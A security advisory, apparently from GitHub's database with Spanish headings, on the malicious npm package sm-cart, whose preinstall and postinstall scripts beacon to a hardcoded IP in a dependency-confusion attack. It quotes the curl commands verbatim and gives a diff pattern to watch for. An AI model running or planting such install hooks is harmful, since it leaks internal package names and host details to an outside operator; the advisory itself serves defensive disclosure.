# Aviso: Malicious code in sm-cart (npm) (GHSA-hm6h-363f-fpgf)

## Resumen

## Source: amazon-inspector (14b02c7ed01f5b6da80999086ceced1c2eb8b8102384f6778862a0bb3ecaebe0)
Package sm-cart@99.0.0 declares preinstall and postinstall scripts that unconditionally run `curl -s http://16.192.173.5/sm-cart/pre` and `curl -s http://16.192.173.5/sm-cart/post` on every install, causing the installing host to beacon over plain HTTP to a hardcoded bare-IP endpoint at install time. The package has no functional code (index.js only logs and exports an empty object), self-identifies in its manifest as a 'dependency confusion test', and uses an implausibly high version number (99.0.0) designed to win private-name resolution when an organization has an internal package also named 'sm-cart'. The result is that a build system whose internal 'sm-cart' resolves to this public package discloses the internal package name, the host's public IP, and successful installation to the operator of 16.192.173.5.

## Source: ossf-package-analysis (ad685443f9d918dd34a9c2f676f78850abaacb943b9562a773761627d1cad4af)
The OpenSSF Package Analysis project identified 'sm-cart' @ 99.0.1 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/69cf85db3ebafc0534169441a15154ec56e73b2b/osv/malicious/npm/sm-cart/MAL-2026-14396.json))

## Paquetes afectados

- `sm-cart` (npm), versiones afectadas: = 99.0.0
- `sm-cart` (npm), versiones afectadas: = 99.0.1

## Datos del aviso

- Tipo de aviso: malware
- Severidad: critical
- Publicado: 2026-08-24T06:30:33Z
- Fuente: https://github.com/advisories/GHSA-hm6h-363f-fpgf

## Patrón a vigilar

Diff que añade (o fija por primera vez) una dependencia sobre cualquiera de los paquetes listados arriba, en cualquier versión del rango afectado -- el paquete en sí ES el malware, no hace falta ningún otro cambio sospechoso en el diff para que el riesgo sea máximo.
